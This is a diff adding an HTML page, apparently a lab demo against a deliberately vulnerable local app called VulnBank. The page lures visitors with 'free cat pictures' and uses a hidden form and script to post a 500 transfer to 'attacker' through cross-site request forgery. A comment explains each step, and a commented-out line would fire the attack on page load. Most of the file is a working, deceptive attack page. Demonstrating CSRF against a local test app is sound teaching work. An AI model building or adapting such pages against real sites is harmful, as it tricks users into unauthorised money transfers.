@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Cat Pictures!!</title>
+  <style>
+    body { font-family: sans-serif; max-width: 500px; margin: 80px auto; text-align: center; }
+    button { padding: 14px 28px; font-size: 1.1em; background: #e53935; color: #fff; border: none;
+             border-radius: 6px; cursor: pointer; margin-top: 20px; }
+    #status { margin-top: 20px; font-size: 0.9em; color: #888; }
+  </style>
+</head>
+<body>
+
+  <h1>Free Cat Pictures!!</h1>
+  <p>Click below to unlock 100 exclusive cat photos, totally free!</p>
+  <button onclick="attack()">Claim Free Cats</button>
+  <div id="status"></div>
+
+  <!--
+    CSRF ATTACK EXPLAINED
+    ─────────────────────
+    1. Victim logs in to VulnBank at http://localhost:3000
+       → browser stores their session cookie
+
+    2. Victim opens THIS page (different origin: file:// or another domain)
+       → they see a harmless-looking button
+
+    3. Victim clicks the button (or we skip the button and auto-submit on load)
+       → JS submits the hidden form to http://localhost:3000/transfer
+
+    4. The browser automatically attaches the victim's session cookie
+       because VulnBank set sameSite: false on the cookie
+
+    5. VulnBank sees a valid session and executes the transfer — done.
+
+    The server never knew the request came from a foreign page.
+    No token was checked. No origin was validated.
+  -->
+  <form id="csrf-form" action="http://localhost:3000/transfer" method="POST" style="display:none">
+    <input type="hidden" name="to"     value="attacker" />
+    <input type="hidden" name="amount" value="500" />
+  </form>
+
+  <script>
+    function attack() {
+      document.getElementById('status').textContent = 'Loading cats...'
+      document.getElementById('csrf-form').submit()
+      // Browser navigates to localhost:3000/dashboard after the POST.
+      // From the victim's POV it just looks like a redirect.
+    }
+
+    // Uncomment to make the attack fire automatically on page load —
+    // no button click required, just visiting the page is enough:
+    // window.onload = attack
+  </script>
+
+</body>
+</html>
